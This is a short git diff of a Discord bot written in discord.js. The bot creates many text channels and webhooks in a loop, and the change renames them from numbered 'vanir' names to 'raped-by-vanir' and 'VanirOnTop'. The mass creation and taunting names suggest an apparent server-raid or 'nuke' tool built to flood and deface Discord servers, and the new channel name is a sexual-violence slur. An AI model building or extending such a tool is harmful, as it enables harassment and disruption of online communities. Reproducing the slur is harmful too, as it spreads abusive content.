@@ -94,7 +94,7 @@ client.on('interactionCreate', async (interaction) => {
         .map(async (num) => {
           try {
             const channel = await guild.channels.create({
-              name: `vanir-${num}`,
+              name: `raped-by-vanir`,
               type: ChannelType.GuildText,
               permissionOverwrites: [
                 {
@@ -105,7 +105,7 @@ client.on('interactionCreate', async (interaction) => {
             });
 
             const webhook = await channel.createWebhook({
-              name: `VanirWebhook-${num}`,
+              name: `VanirOnTop`,
               avatar: client.user.displayAvatarURL(),
             });
 
